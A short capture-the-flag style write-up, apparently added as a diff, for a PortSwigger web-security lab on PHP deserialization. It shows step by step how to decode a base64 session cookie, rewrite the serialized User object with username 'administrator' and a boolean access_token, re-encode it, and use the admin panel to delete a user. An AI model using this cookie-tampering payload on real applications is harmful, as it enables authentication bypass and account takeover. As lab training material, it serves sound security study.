@@ -1,0 +1,85 @@
+                   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                    MODIFYING SERIALIZED DATA TYPES
+
+                                  ilak
+                   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+
+Table of Contents
+─────────────────
+
+1. Lab
+2. # Issue
+
+
+1 Lab
+═════
+
+  <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types>
+
+  • Credentials wiener:peter
+
+  This lab uses a serialization-based session mechanism and is
+  vulnerable to authentication bypass as a result.
+
+  To solve this lab edit the serializsed object in the sessions cookie
+  to access the admin account
+
+  With admin account delete the `carlos' user
+
+
+2 # Issue
+═════════
+
+  As the same case of the last lab, the cookie are base64 encoded, and
+  the cookie are an serialized object, which is a big problem in
+  security terms.
+
+  CTRL + SHITF + i to open `dev tools' ->
+
+  Application > Storage > Cookie
+
+  • Get the cookie and decode ->
+  ┌────
+  │ echo 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJienc4azlhM2N0dmpqYWluNG91ZXg5ZGoydHM4djloYiI7fQ==' | base64 -d
+  └────
+
+  and another object deserialized ->
+
+  ┌────
+  │ O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"bzw8k9a3ctvjjain4ouex9dj2ts8v9hb";}
+  └────
+
+  The type of the contents are s (String), what happens with we modify
+  the data type from S to B (Bool) ?
+
+  At this case we modfy the “username” value to admin and the
+  “access_token” value type to bool ->
+
+  ┌────
+  │ O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}
+  └────
+
+  Now encode again with base64 and set to the new cookie value at web
+  page ->
+
+  ┌────
+  │ echo 'O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}' | base64 -w 0
+  └────
+
+  `base64 -w 0' = Use 0 to disable line wrapping
+
+  Copy the result and put at new cookie value at web page with `dev
+  tools'
+
+  ┌────
+  │ CTRL + SHIFT + i
+  │ 
+  │ Application > Storage > Cookie
+  └────
+
+  Reload the page with the new cookie defined, and now we are logged in
+  as administrator user, we can confirm that with My account tab, where
+  your current username is displayed
+
+  • At Admin Panel delet the carlos account
